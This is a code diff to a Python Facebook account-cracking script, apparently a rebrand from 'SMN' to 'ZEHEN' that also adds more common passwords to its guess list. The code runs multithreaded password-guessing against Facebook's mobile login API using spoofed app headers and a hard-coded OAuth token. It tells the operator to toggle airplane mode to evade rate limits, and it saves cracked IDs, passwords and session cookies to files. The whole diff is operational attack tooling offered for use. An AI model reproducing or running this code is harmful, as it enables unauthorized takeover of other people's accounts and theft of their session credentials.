@@ -53,12 +53,12 @@ def x1():
     return ua	
 
 
-DX_POWER_143 = requests.get("https://raw.githubusercontent.com/MosarofSMNkhan/Ua1.txt/main/Ua_text").text.splitlines()
+DX_POWER_143 = requests.get("https://raw.githubusercontent.com/MosarofZEHENkhan/Ua1.txt/main/Ua_text").text.splitlines()
 
 TARA_505 = random.choice(DX_POWER_143)
 
 
-VERSION = requests.get("https://raw.githubusercontent.com/MosarofSMNkhan/Version/main/Version.text").text.splitlines()
+VERSION = requests.get("https://raw.githubusercontent.com/MosarofZEHENkhan/Version/main/Version.text").text.splitlines()
 
 V = random.choice(VERSION)
 def u1():
@@ -151,11 +151,11 @@ def result(OKs,cps):
         print(f'\r{A}──────────────────────────────────────────────────')
         input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
         exit()                
-def sojib():
+def zehen():
 	a=str(os.geteuid())
 	b=str(os.getlogin())
 	y="".join(a+b)
-	key=f"SMN_{y}_PAID"
+	key=f"ZEHEN_{y}_PAID"
 	row=httpx.get("https://github.com/SIHAB-404/Approval/blob/main/Approval.txt").text
 	if key in row:
 		menu()
@@ -243,7 +243,7 @@ def _bd_():
         print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
         for love in user:
             ids = code+name+cod+love
-            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','first123','firstlast']
+            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','first123','firstlast','first1122','first@123','@#@#@#@','0987654','jungkook','first@@@','last1122','i love you','@@@@@@','@123456#']
             sexy.submit(randm,ids,psd)
     print('')
     print(f'\r{A}──────────────────────────────────────────────────')
@@ -313,7 +313,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SMN.txt');linex()
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/ZEHEN.txt');linex()
         self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
         try:
             self.id = open(self.file).read().splitlines()
@@ -331,7 +331,7 @@ class main_crack():
         try:
             global oks,cps,loop
             ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SMN-M1{G1}]{R}[{sid}][{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}ZEHEN-M1{G1}]{R}[{sid}][{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -365,7 +365,7 @@ class main_crack():
                 headers = {'User-Agent':u1(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'Wi-Fi', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SMNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SMNb};{ckkk}"
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ZEHENb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ZEHENb};{ckkk}"
                     print(f"\r\r{G1}[AF-OK] {sid} | {ps} ")
                     open('/sdcard/ZEHEN-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
@@ -383,7 +383,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop,prox
-            sys.stdout.write(f"\r{G1}[{A}SMN-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.write(f"\r{G1}[{A}ZEHEN-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -433,14 +433,14 @@ class main_crack():
                     'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, proxies=proxs, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SMNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SMNb};{ckkk}"
-                    print(f"\r\r{G1}[SMN-OK] {sid} | {ps} ")
-                    open('/sdcard/SMN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ZEHENb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ZEHENb};{ckkk}"
+                    print(f"\r\r{G1}[ZEHEN-OK] {sid} | {ps} ")
+                    open('/sdcard/ZEHEN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[SMN-CP] {sid} | {ps} ")
-                    open('/sdcard/SMN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                    print(f"\r\r{M}[ZEHEN-CP] {sid} | {ps} ")
+                    open('/sdcard/ZEHEN-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                 else:
                     continue
@@ -468,7 +468,7 @@ class main_crack():
             print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
             print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
             linex()            
-            with Habib(max_workers=30) as SMNworld:
+            with Habib(max_workers=30) as ZEHENworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -478,15 +478,15 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                SMNworld.submit(self.methodA, uid, name, pwx)
+                                ZEHENworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                SMNworld.submit(self.methodB, uid, name, pwx)
+                                ZEHENworld.submit(self.methodB, uid, name, pwx)
                    except:pass
             result(oks,cps)
 #__________________[ RANDOM METHOD ]__________________#
 def randm(ids,psd):
     global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}SMN-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
+    sys.stdout.write(f"\r{G1}[{A}ZEHEN-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -535,7 +535,7 @@ def randm(ids,psd):
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[SMN-OK] {uid} | {pas}')
+                print(f'\r\r{G1}[ZEHEN-OK] {uid} | {pas}')
                 #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                 open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
@@ -545,5 +545,5 @@ def randm(ids,psd):
     except Exception as e:
         pass
           
-sojib()
+zehen()
 #__________________[ END ]__________________#
